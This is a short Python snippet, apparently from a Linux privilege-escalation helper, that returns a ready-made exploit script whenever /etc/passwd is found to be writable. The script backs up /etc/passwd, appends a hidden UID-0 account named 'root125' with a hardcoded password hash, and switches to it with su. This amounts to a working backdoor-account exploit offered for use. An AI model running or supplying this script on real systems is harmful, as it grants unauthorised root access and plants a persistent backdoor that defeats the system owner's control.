script = """
cp /etc/passwd /tmp/passwd.bac
echo 'root125:$6$XYve5DPaJ07W8hah$bUwkQVpAbuOpZNgL/EGbV55WPSKKWKr4fakGWHQJNDOkFCmSlEyZ7jwSgGAhhUeAiBYh8ceDSaJfGSyCS6gnU1:0:0:root:/root:/bin/bash' >> /etc/passwd
su root125 # password
"""

def passwdResults(message):
  if message.strip().lower() == "write":
    return {
      "title": "/etc/passwd File",
      "results": [{
        "message": "The /etc/passwd file has write permission",
        "scripts": [ script ]
      }]
    }

  return ""
